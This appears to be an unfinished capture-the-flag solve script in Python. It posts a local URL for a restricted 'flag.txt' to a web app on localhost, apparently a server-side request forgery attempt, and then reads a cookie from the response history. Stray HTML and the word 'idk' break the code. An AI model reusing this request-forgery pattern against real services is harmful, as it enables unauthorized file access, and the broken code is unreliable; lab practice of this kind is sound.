#NOT FINISHED

import requests as r
import time
import random
import os
import hashlib

url = "http://127.0.0.1:3000"

r1 = r.post(f"{url}",data={
    "url":"http://127.0.0.1:3000/restricted_memes/flag.txt",
})

r1 = r.post(f"{url}/captionsubmit",data={
    "caption": ''
})

flag = r1.history[0].headers['Set-Cookie']

<img src="{{fried}}">

idk

print(r1)
